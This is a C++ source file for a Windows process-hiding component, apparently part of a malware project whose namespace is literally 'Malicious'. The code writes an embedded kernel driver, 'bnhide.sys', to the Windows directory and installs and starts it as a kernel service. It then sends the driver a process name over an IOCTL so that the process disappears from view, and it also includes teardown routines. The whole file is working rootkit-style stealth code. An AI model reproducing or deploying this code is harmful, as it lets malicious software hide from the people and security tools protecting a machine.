#include "ProcessHider.hpp"
#include "StealthDriver.hpp"
#include "BinaryRessource.hpp"
#include <system/System.hpp>
#include <common/Log.hpp>

#ifdef  _WIN32_IE
#undef _WIN32_IE
#endif
#define _WIN32_IE 0x0501

#define SYS_DRIVER_FILENAME "bnhide.sys"
#define IOCTL_NAME_PRCSS CTL_CODE(40000, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
enum {MAXLEN_NAME=30};
char sznamesys[] = "bnhide";

namespace Malicious
{
    typedef struct _DATA_SURVEY
    {
        unsigned long len;
        wchar_t name[MAXLEN_NAME];
    } DATA_SURVEY, *PDATA_SURVEY;
    
    ProcessHider::ProcessHider()
    {
		std::string windownPath;
		System::getWindowsPath(windownPath);
        driverPath = windownPath + "\\" + SYS_DRIVER_FILENAME;
        
        BinaryRessource driver(StealthDriver, sizeof(StealthDriver), driverPath, true);
        
        openServiceManager();
        startService();
        closeService();
        closeServiceManager();
    }

    ProcessHider::~ProcessHider()
    {
        closeService();
        closeServiceManager();
    }

    void ProcessHider::hide(const std::string& processName)
    {
        HANDLE hdev = CreateFile("\\\\.\\bnhide", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
        if(hdev == INVALID_HANDLE_VALUE)
        {
            throw DriverError("Unable to create device file (CreateFile) : "+toString(GetLastError()));
        }

        DATA_SURVEY dts;
        char szname[MAXLEN_NAME + 4];
        strncpy(szname, processName.c_str(), MAXLEN_NAME);
        dts.len = processName.size();

        if(dts.len)
        {
            WCHAR name[MAXLEN_NAME + 1];
            MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, szname, -1, name, MAXLEN_NAME + 1);
            memcpy(dts.name, name, dts.len * 2);
        }

        DWORD d = 0;
        BOOL b = DeviceIoControl(hdev, (DWORD) IOCTL_NAME_PRCSS, &dts, sizeof(DATA_SURVEY), 0, 0, &d, 0);
        CloseHandle(hdev);
        if(!b)
        {
			throw DriverError("DeviceIoControl failed : "+toString(GetLastError()));
        }
    }

    void ProcessHider::remove()
    {
        openServiceManager();
        openService();
        stopService();
        closeService();
        closeServiceManager();
    }

    void ProcessHider::openServiceManager()
    {
        manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if(!manager)
        {
            throw DriverError("OpenSCManager failed : "+toString(GetLastError()));
        }
    }
    
    void ProcessHider::closeServiceManager()
    {
        CloseServiceHandle(manager);
    }

    void ProcessHider::openService()
    {
        service = OpenService(manager, sznamesys, SERVICE_ALL_ACCESS);
        if(!service)
        {
            throw DriverError("OpenService failed : "+toString(GetLastError()));
        }
    }

    void ProcessHider::closeService()
    {
        CloseServiceHandle(service);
    }

    void ProcessHider::startService()
    {
        service = CreateService(
			manager, 
			sznamesys,
			sznamesys,
            SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START, 
			SERVICE_ERROR_CRITICAL, //SERVICE_ERROR_NORMAL, 
			driverPath.c_str(),
            NULL, NULL, NULL, NULL, NULL);
        if(!service)
        {
			DWORD lastError = GetLastError();
            if(lastError == ERROR_SERVICE_EXISTS)
            {
                LOG << "Service already exists";
                openService();
            }
            else 
            {
                throw DriverError("CreateService failed : "+toString(GetLastError()));
            }
        }
        if(!StartService(service, 0, 0))
        {
            throw DriverError("StartService failed : "+toString(GetLastError()));
        }
    }

    void ProcessHider::stopService()
    {
		TRACE_FUNCTION
        SERVICE_STATUS status;
        ControlService(service, SERVICE_CONTROL_STOP, &status);
        if(!DeleteService(service)) 
        {
            throw DriverError("DeleteService failed : "+toString(GetLastError()));
        }
    }
} // Malicious


